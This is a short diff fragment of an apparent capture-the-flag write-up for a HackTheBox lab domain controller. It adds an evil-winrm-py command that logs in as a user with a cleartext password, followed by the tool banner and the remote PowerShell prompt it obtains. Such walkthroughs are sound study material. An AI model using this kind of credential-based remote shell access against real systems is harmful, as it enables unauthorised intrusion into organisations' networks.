@@ -426,5 +426,15 @@ WINRM       10.129.230.179  5985   DC-ANALYSIS      [+] analysis.htb\jdoe:7y4Z4^
 This user can WINRM
 
 ```python
+❯❯❯ python3 venv/bin/evil-winrm-py -i dc-analysis.analysis.htb -u jdoe -p '7y4Z4^*y9Zzj'
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.7.0
 
+[*] Connecting to 'dc-analysis.analysis.htb:5985' as 'jdoe'
+evil-winrm-py PS C:\Users\jdoe\Documents>
 ```
+
+There is a known bug at th
